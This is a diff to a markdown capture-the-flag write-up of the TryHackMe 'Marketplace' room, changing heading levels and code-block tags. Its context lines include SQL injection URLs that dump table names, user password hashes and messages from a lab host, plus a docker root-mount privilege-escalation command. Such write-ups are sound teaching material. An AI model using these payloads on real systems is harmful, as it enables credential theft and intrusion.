@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/marketplace
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Market Place](https://tryhackme.com/room/marketplace) from [TryHackMe](https://tryhackme.com). The machine is running a web server with couple of vulnerabilities. We start by exploiting a XSS vulnerability to get admin cookie, then we use sql injection to read sensitive information in the database where we find ssh password. After gaining a foothold, we exploit a wildcard misconfiguration to escalate horizontally, then we abuse docker to get root.
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -53,7 +53,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We found three open ports on an Ubuntu linux machine. There is port 22 running OpenSSH, port 80 running nginx and port 32768 running Node.js.
 
-## Web
+### Web
 
 Let's navigate to the web page on port 80.
 
@@ -115,7 +115,7 @@ Clicking on one of the users we get redirected to `http://10.10.109.12/admin?use
 
 ![](11.png)
 
-# **Foothold**
+## **Foothold**
 
 Let's try adding an `'` to the user parameter.
 
@@ -131,7 +131,7 @@ We got an error on 5 which means there are 4 columns.
 
 Now we need to find the right columns where we can do our sql injection. We can use the following payload.
 
-```
+```text
 12 UNION SELECT 5,7,3,4
 ```
 
@@ -141,7 +141,7 @@ We changed the value of user to a one that doesn't exist for it to work.
 
 To get the name of the database, we use the following query.
 
-```
+```text
 http://10.10.109.12/admin?user=12 UNION SELECT 5,database(),3,4
 ```
 
@@ -149,7 +149,7 @@ http://10.10.109.12/admin?user=12 UNION SELECT 5,database(),3,4
 
 To list the tables, we use the following query.
 
-```
+```text
 http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(table_name),3,4 fRoM+information_schema.tables+wHeRe+table_schema=database()
 ```
 
@@ -165,7 +165,7 @@ http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(column_name),3,4 f
 
 Now we dump the usernames and passwords with this query.
 
-```
+```text
 http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(username,password),3,4 from users;
 ```
 
@@ -176,7 +176,7 @@ We got hashed password, before we try to crack them, let's take a look at the ot
 
 Let's check the messages table with the following query.
 
-```
+```text
 http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(column_name),3,4 fRoM+information_schema.columns+wHeRe+table_name='messages'
 ```
 
@@ -184,7 +184,7 @@ http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(column_name),3,4 f
 
 Let's see what's on the `message_content` column.
 
-```
+```text
 http://10.10.109.12/admin?user=12 UNION SELECT 5,group_concat(message_content),3,4 from messages;
 ```
 
@@ -196,7 +196,7 @@ We got a password for ssh. Let's try logging with one of the two users we found.
 
 We managed to login as `jake`.
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 Let's check our privileges with `sudo -l`.
 
@@ -252,7 +252,3 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
-
-# References
